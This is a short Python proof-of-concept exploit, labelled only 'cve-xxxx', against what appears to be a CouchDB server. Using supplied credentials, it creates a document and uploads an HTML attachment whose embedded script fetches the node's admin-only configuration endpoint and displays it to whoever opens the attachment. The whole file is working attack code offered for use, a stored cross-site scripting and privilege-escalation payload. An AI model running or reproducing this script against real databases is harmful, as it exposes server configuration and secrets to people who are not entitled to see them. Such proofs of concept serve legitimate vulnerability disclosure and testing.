from urllib.request import Request, urlopen
import base64
import sys
import uuid
import json
 
if len(sys.argv) < 4:
    print('Usage: cve-xxxx <host> <db> <user:pass>')
    sys.exit(1) 
 
url = "http://" + sys.argv[1]
db = sys.argv[2]
creds = sys.argv[3]
encoded_creds = base64.b64encode(creds.encode('ascii'))
 
# create a document to host the payload if one wasn't specified
doc_id = uuid.uuid4()
document_payload = {
    "_id":f"evildoc-{doc_id}",
    "foo":"bar"
}
 
print("Creating document to host maclicious attachment...")
req = Request(f"{url}/{db}/evildoc{doc_id}", data=json.dumps(document_payload).encode('utf-8'), method='PUT')
req.add_header('Authorization', 'Basic %s' % encoded_creds.decode("ascii"))
req.add_header('Content-Type', 'application/json')
res = urlopen(req)
json = res.read().decode()
print(f"Created {url}/{db}/evildoc{doc_id}")
 
payload = f"""
 
<script>
    const configUrl = "{url}/_node/_local/_config"
 
    fetch(configUrl)
        .then(res => res.json())
        .then(data => document.querySelector("#config_info").innerHTML = `<pre>${{JSON.stringify(data, null, 2)}}</pre>`)
</script>
<div id="config_info">
    fetching node config info that definitely only admins should be able to access...
</div>
 
"""
 
print("Uploading malicious attachment...")
req = Request(f"{url}/{db}/evilattachment-{uuid.uuid4()}/attachment.html", data=payload.encode('utf-8'), headers={"Content-Type": "text/html"}, method='PUT')
req.add_header('Authorization', 'Basic %s' % encoded_creds.decode("ascii"))
res = urlopen(req)
json = res.read().decode()
headers = res.getheaders()
evil_doc_url = res.info()["location"] 
print("Attachment URL: ")
print(evil_doc_url)
